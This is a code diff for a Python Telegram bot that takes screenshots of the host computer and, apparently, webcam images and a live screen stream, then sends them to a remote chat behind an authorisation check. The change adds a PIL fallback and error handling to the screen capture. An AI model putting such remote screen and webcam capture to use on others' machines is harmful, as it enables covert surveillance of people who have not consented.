@@ -160,11 +160,19 @@ async def screenshot_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not await check_auth(update): return
     await update.message.reply_text("Taking screenshot... 📸")
     screenshot_path = os.path.join(TEMP_DIR, "screenshot.png")
-    pyautogui.screenshot(screenshot_path)
-    with open(screenshot_path, "rb") as photo:
-        await update.message.reply_photo(photo)
-    if os.path.exists(screenshot_path):
-        os.remove(screenshot_path)
+    try:
+        try:
+            pyautogui.screenshot(screenshot_path)
+        except Exception:
+            from PIL import ImageGrab
+            im = ImageGrab.grab(all_screens=False)
+            im.save(screenshot_path)
+        with open(screenshot_path, "rb") as photo:
+            await update.message.reply_photo(photo)
+        if os.path.exists(screenshot_path):
+            os.remove(screenshot_path)
+    except Exception as e:
+        await update.message.reply_text(f"❌ Screenshot failed: {e}")
 
 async def webcam_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not await check_auth(update): return
@@ -238,7 +246,12 @@ async def livescreen_loop(update, context):
     while is_livestreaming:
         try:
             screenshot_path = os.path.join(TEMP_DIR, "live_screen.png")
-            pyautogui.screenshot(screenshot_path)
+            try:
+                pyautogui.screenshot(screenshot_path)
+            except Exception:
+                from PIL import ImageGrab
+                im = ImageGrab.grab(all_screens=False)
+                im.save(screenshot_path)
             with open(screenshot_path, "rb") as photo:
                 await update.message.reply_photo(photo)
             if os.path.exists(screenshot_path):
